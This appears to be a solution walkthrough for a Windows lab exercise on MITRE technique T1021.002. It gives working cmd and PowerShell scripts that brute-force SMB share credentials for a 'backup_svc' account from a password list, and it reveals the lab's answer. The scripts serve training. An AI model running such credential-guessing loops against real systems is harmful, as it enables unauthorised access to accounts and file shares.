# T1021.002 – SMB Credential Brute Force | Solution Walkthrough
**Difficulty:** Intermediate | **OS:** Windows | **MITRE:** T1021.002

## Step 1 – Brute Force via Batch Loop
```cmd
for /f %p in (C:\Users\Public\passwords.txt) do @net use \\localhost\C$ /user:backup_svc %p 2>nul && echo FOUND: %p && goto done
:done
```

## Step 2 – PowerShell Brute Force
```powershell
$passwords = Get-Content "C:\Users\Public\passwords.txt"
foreach ($p in $passwords) {
    $sec = ConvertTo-SecureString $p -AsPlainText -Force
    $cred = New-Object PSCredential("backup_svc", $sec)
    try {
        $null = New-PSDrive -Name T -PSProvider FileSystem -Root "\\localhost\C$" -Credential $cred -EA Stop
        Write-Host "[+] FOUND: $p"
        Remove-PSDrive T
        break
    } catch { Write-Host "[-] Failed: $p" }
}
# backup123 will succeed!
```
